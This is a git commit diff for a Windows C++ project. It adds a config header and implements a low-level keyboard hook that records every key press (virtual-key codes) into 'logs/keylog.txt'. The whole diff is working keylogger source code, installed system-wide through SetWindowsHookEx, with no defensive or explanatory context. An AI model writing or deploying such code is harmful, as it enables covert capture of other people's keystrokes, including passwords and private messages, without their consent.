bcdea28c01cec658411cca5316c2999ff0d25440
stephenthajeb <Sthajeb1@gmail.com>
2025-07-06 16:55:47 +1000

    hook implementation

---
+++ src/config.h
@@ -0,0 +1,6 @@
+#ifndef CONFIG_H
+#define CONFIG_H
+
+#define LOG_FILE_PATH "logs/keylog.txt"
+
+#endif
--- src/hook.cpp
+++ src/hook.cpp
@@ -1,8 +1,43 @@
+#include <windows.h>
 #include "hook.h"
+#include "config.h"
 
-BOOL installHook(){
-    return TRUE;
+HHOOK hHook = NULL;
+
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    if (nCode == HC_ACTION)
+    {
+        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
+
+        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
+        {
+            DWORD vkCode = p->vkCode;
+
+            // append mode
+            FILE *file = fopen(LOG_FILE_PATH, "a");
+            if (file)
+            {
+                fprintf(file, "Key pressed: %lu\n", vkCode);
+                fclose(file);
+            }
+        }
+    }
+
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-void uninstallHook(){
+BOOL installHook()
+{
+    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
+    return hHook != NULL;
+}
+
+void uninstallHook()
+{
+    if (hHook != NULL)
+    {
+        UnhookWindowsHookEx(hHook);
+        hHook = NULL;
+    }
 }
